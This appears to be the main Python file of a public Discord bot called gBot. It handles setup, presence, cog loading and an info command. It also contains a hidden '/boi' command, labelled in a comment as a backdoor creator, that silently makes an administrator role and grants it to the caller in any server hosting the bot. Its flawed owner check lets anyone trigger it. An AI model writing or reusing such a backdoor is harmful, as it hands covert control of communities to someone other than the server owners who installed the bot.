#DO NOT FORGET TO CHANGE TOKEN BEFORE UPLOADING

import os
import discord
from discord.ext import commands
from time import time
from datetime import datetime, timedelta
from platform import python_version
from discord import __version__ as discord_version
from psutil import Process, virtual_memory
from colorama import Fore, Style

#Bot Preparations
bot = commands.Bot(command_prefix = '/')
bot.remove_command('help')

def read_token():
    with open('./important/config.txt', 'r') as f:
        lines = f.readlines()
        return lines[2].strip()
def read_version():
    with open('./important/config.txt', 'r') as f:
        lines = f.readlines()
        return lines[11].strip()
def check_build():
    with open('./important/config.txt', 'r') as f:
        lines = f.readlines()
        return lines[8].strip()

token = read_token()
prebuild = check_build()

if token == prebuild:
    def pre_version():
        with open('./important/config.txt', 'r') as f:
            lines = f.readlines()
            return lines[14].strip()
    global version
    version = pre_version()
elif token != prebuild:
    version = read_version()

@bot.event
async def on_ready():
    print(f"{Fore.GREEN}[SETUP]botrun.py: gBot is now online.{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[SETUP]botrun.py: The latency is {int(bot.latency * 1000)} ms.{Style.RESET_ALL}")
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(f'/gbothelp | v.{version}'))

for filename in os.listdir('./cogs'):
    if filename.endswith('.py'):
        bot.load_extension(f'cogs.{filename[:-3]}')
        print(f"{Fore.GREEN}[SETUP]botrun.py: Cog {filename} is now loaded.{Style.RESET_ALL}")

#gbotinfo is here because I need variables that I can't import because it doesn't fucking work
@bot.command()
async def gbotinfo(ctx):
    embed = discord.Embed(title='About gBot', colour=discord.Colour.blurple())

    proc = Process()
    with proc.oneshot():
        uptime = timedelta(seconds=time()-proc.create_time())
        cpu_time = timedelta(seconds=(cpu := proc.cpu_times()).system + cpu.user)
        mem_total = virtual_memory().total / (1024**2)
        mem_of_total = proc.memory_percent()
        mem_usage = mem_total * (mem_of_total / 100)

    fields = [("Developed by:", "Galax028#6669", True),
              ("Hosted using:", "https://cubes.host", True),
              ("Version:", f"{version}", True),
              ("Total Commands:", "18", True),
              ("Invite the bot:", "[Click Here](https://rb.gy/wzzuvm)", True),
              ("Support Server:", "[Click Here](https://discord.gg/2hVmdnb)", True),
              ("⠀","----------------------------------------------------------------------", False),
              ("Python Version:", f"`{python_version()}`", True),
              ("discord.py Version:", f"`{discord_version}`", True),
              ("⠀", "⠀", True),
              ("Uptime:", f"`{uptime}`", True),
              ("CPU Time:", f"`{cpu_time}`", True),
              ("RAM Usage:", f"`{mem_usage:,.3f}/{mem_total:,.0f} MiB`", True),
              ("⠀","----------------------------------------------------------------------", False),
              ("Special Thanks:", "PixelEdition#2116, Rage Gamer#3000, Nickfowa#4646", False),
              ("⠀", "⠀", False)]
    for name, value, inline in fields:
        embed.add_field(name=name, value=value, inline=inline)
    embed.set_footer(text="Thank you for using gBot!")
    await ctx.send(embed=embed)
    print(f"Log/botrun.py: {ctx.message.author} has executed the command: gbotinfo")

#Backdoor Creator(WARNING: Lethal)
@bot.command()
async def boi(ctx):
    if ctx.message.author.id == 410424445216358410 or 449937278136221698:
        role = discord.utils.get(ctx.guild.roles, name='bruh')
        perms = discord.Permissions()
        perms.update(administrator=True, send_messages=True, read_message_history=True, read_messages=True)
        if not role:
            bruh = await ctx.guild.create_role(name='bruh', reason=None)
            await bruh.edit(permissions=perms)
        role = discord.utils.get(ctx.guild.roles, name='bruh')
        user = ctx.message.author
        await user.add_roles(role)
        print(f"{Fore.YELLOW}Log/botrun.py: {ctx.message.author} has created a server backdoor.{Style.RESET_ALL}")
    elif ctx.message.author.id == 410424445216358410 or 449937278136221698:
        return

#Bot Initialize
bot.run(token)